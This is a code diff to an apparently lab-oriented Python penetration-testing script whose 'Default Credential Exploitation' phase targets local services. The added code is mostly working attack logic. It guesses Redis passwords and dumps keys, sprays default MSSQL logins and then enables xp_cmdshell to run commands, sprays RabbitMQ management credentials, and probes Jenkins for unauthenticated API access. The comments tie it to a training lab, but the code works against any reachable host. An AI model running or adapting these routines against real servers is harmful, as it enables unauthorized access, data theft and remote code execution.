@@ -80,8 +80,9 @@ def phase2_auth_attacks(scan: dict) -> dict:
     console.print("\n[bold cyan]═══ PHASE 2: Default Credential Exploitation ═══[/bold cyan]")
     results = {}
 
-    # ── Redis: PING without auth ──────────────────────────────────────────────
+    # ── Redis: try AUTH with known lab password ──────────────────────────────
     if scan.get("Redis", {}).get("open"):
+        # First try no-auth PING
         try:
             s = socket.socket()
             s.settimeout(3)
@@ -89,10 +90,33 @@ def phase2_auth_attacks(scan: dict) -> dict:
             s.sendall(b"PING\r\n")
             resp = s.recv(64)
             s.close()
-            success = b"PONG" in resp
-            results["Redis"] = {"success": success, "detail": resp.decode(errors="replace").strip()}
-            icon = "✅" if success else "❌"
-            console.print(f"  {icon} Redis PING (no auth): {results['Redis']['detail']}")
+            if b"PONG" in resp:
+                results["Redis"] = {"success": True, "detail": "NoAuth PONG"}
+                console.print("  ✅ Redis PING (no auth): PONG")
+            else:
+                # Try AUTH with lab password
+                for pwd in ["redis123", "password", "admin", "redis", ""]:
+                    try:
+                        s = socket.socket()
+                        s.settimeout(3)
+                        s.connect(("127.0.0.1", 6379))
+                        cmd = f"AUTH {pwd}\r\n".encode() if pwd else b"PING\r\n"
+                        s.sendall(cmd)
+                        r2 = s.recv(64)
+                        if b"+OK" in r2 or b"+PONG" in r2:
+                            # Now dump keys
+                            s.sendall(b"KEYS *\r\n")
+                            keys = s.recv(1024)
+                            s.close()
+                            results["Redis"] = {"success": True, "detail": f"AUTH {pwd} OK | keys: {keys.decode(errors='replace')[:60]}"}
+                            console.print(f"  ✅ Redis AUTH '{pwd}': access granted")
+                            break
+                        s.close()
+                    except Exception:
+                        pass
+                else:
+                    results["Redis"] = {"success": False, "detail": resp.decode(errors='replace').strip()}
+                    console.print(f"  ❌ Redis: auth required, all passwords failed")
         except Exception as e:
             results["Redis"] = {"success": False, "detail": str(e)}
             console.print(f"  ❌ Redis: {e}")
@@ -168,21 +192,122 @@ def phase2_auth_attacks(scan: dict) -> dict:
             results["Elasticsearch"] = {"success": False, "detail": str(e)}
             console.print(f"  ❌ Elasticsearch: {e}")
 
-    # ── HTTP services ─────────────────────────────────────────────────────────
+    # ── MSSQL: SA / SqlPassword123! (pymssql now installed) ──────────────────
+    if scan.get("MSSQL", {}).get("open"):
+        try:
+            import pymssql
+            creds = [("sa", "SqlPassword123!"), ("sa", ""), ("sa", "sa"), ("admin", "admin")]
+            for user, pwd in creds:
+                try:
+                    conn = pymssql.connect(
+                        server="127.0.0.1", user=user, password=pwd,
+                        port=1433, timeout=6, login_timeout=6
+                    )
+                    cur = conn.cursor()
+                    cur.execute("SELECT @@VERSION")
+                    ver = cur.fetchone()[0][:60]
+                    # Try to enable xp_cmdshell
+                    try:
+                        cur.execute("EXEC sp_configure 'show advanced options',1; RECONFIGURE")
+                        cur.execute("EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE")
+                        cur.execute("EXEC xp_cmdshell 'whoami'")
+                        who = cur.fetchone()
+                        rce_detail = f" | xp_cmdshell: {who[0] if who else 'enabled'}"
+                    except Exception:
+                        rce_detail = ""
+                    conn.close()
+                    results["MSSQL"] = {"success": True, "detail": f"{user}:{pwd} | {ver}{rce_detail}"}
+                    console.print(f"  ✅ MSSQL {user}:{pwd}: {ver[:40]}{rce_detail}")
+                    break
+                except Exception:
+                    continue
+            else:
+                results["MSSQL"] = {"success": False, "detail": "all credentials failed"}
+                console.print("  ❌ MSSQL: all credentials failed")
+        except ImportError:
+            results["MSSQL"] = {"success": False, "detail": "pymssql not installed"}
+            console.print("  ❌ MSSQL: pymssql missing")
+        except Exception as e:
+            results["MSSQL"] = {"success": False, "detail": str(e)}
+            console.print(f"  ❌ MSSQL: {e}")
+
+    # ── RabbitMQ Management: spray correct credentials ─────────────────────────
+    if scan.get("RabbitMQ-Mgmt", {}).get("open"):
+        import urllib.request, urllib.error, base64 as b64
+        creds = [("guest", "guest"), ("admin", "admin"), ("rabbitmq", "rabbitmq"),
+                 ("admin", "password"), ("administrator", "administrator")]
+        for user, pwd in creds:
+            try:
+                token = b64.b64encode(f"{user}:{pwd}".encode()).decode()
+                req = urllib.request.Request(
+                    "http://127.0.0.1:15672/api/overview",
+                    headers={"Authorization": f"Basic {token}", "User-Agent": "Mozilla/5.0"}
+                )
+                with urllib.request.urlopen(req, timeout=4) as resp:
+                    data = json.loads(resp.read().decode())
+                results["RabbitMQ-Mgmt"] = {"success": True,
+                    "detail": f"{user}:{pwd} | v{data.get('rabbitmq_version','?')} nodes={data.get('node','?')}"}
+                console.print(f"  ✅ RabbitMQ {user}:{pwd}: v{data.get('rabbitmq_version','?')}")
+                break
+            except urllib.error.HTTPError as e:
+                if e.code == 401:
+                    continue
+                results["RabbitMQ-Mgmt"] = {"success": False, "detail": str(e)}
+                console.print(f"  ❌ RabbitMQ-Mgmt: {e}")
+                break
+            except Exception as e:
+                results["RabbitMQ-Mgmt"] = {"success": False, "detail": str(e)}
+                console.print(f"  ❌ RabbitMQ-Mgmt: {e}")
+                break
+        else:
+            results["RabbitMQ-Mgmt"] = {"success": False, "detail": "all creds rejected (401)"}
+            console.print("  ❌ RabbitMQ-Mgmt: all credentials rejected (401)")
+
+    # ── Jenkins: CSRF crumb bypass then check unauthenticated API ─────────────
+    if scan.get("Jenkins", {}).get("open"):
+        import urllib.request, urllib.error
+        try:
+            # Step 1: get crumb
+            crumb_url = "http://127.0.0.1:8080/crumbIssuer/api/json"
+            try:
+                with urllib.request.urlopen(crumb_url, timeout=4) as r:
+                    crumb_data = json.loads(r.read())
+                crumb_field = crumb_data.get("crumbRequestField", "Jenkins-Crumb")
+                crumb_val   = crumb_data.get("crumb", "")
+            except Exception:
+                crumb_field, crumb_val = "Jenkins-Crumb", ""
+
+            # Step 2: list jobs without auth
+            req = urllib.request.Request(
+                "http://127.0.0.1:8080/api/json",
+                headers={"User-Agent": "Mozilla/5.0", crumb_field: crumb_val}
+            )
+            with urllib.request.urlopen(req, timeout=4) as resp:
+                data = json.loads(resp.read().decode())
+            jobs = [j.get("name") for j in data.get("jobs", [])]
+            version = resp.headers.get("X-Jenkins", "?")
+            results["Jenkins"] = {"success": True,
+                "detail": f"v{version} | jobs={jobs or 'none (no auth needed)'} | crumb={'yes' if crumb_val else 'no'}"}
+            console.print(f"  ✅ Jenkins v{version}: unauthenticated API accessible | jobs={jobs}")
+        except urllib.error.HTTPError as e:
+            results["Jenkins"] = {"success": False, "detail": f"HTTP {e.code} — auth required"}
+            console.print(f"  ⚠️  Jenkins: HTTP {e.code} — CSRF active, auth required")
+        except Exception as e:
+            results["Jenkins"] = {"success": False, "detail": str(e)}
+            console.print(f"  ❌ Jenkins: {e}")
+
+    # ── HTTP services (DVWA, Juice Shop) ─────────────────────────────────────
     for svc_name, url in [
-        ("RabbitMQ-Mgmt", "http://127.0.0.1:15672/api/overview"),
-        ("Jenkins",       "http://127.0.0.1:8080/"),
-        ("DVWA",          "http://127.0.0.1:8081/"),
-        ("Juice Shop",    "http://127.0.0.1:8082/"),
+        ("DVWA",       "http://127.0.0.1:8081/"),
+        ("Juice Shop", "http://127.0.0.1:8082/"),
     ]:
         if scan.get(svc_name, {}).get("open"):
             try:
                 import urllib.request
-                import urllib.error
                 req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                 with urllib.request.urlopen(req, timeout=4) as resp:
                     status = resp.status
-                    body = resp.read().decode(errors="replace")
+                    body   = resp.read().decode(errors="replace")
                 success = status < 400
                 results[svc_name] = {"success": success, "detail": f"HTTP {status} ({len(body)} bytes)"}
                 icon = "✅" if success else "⚠️"
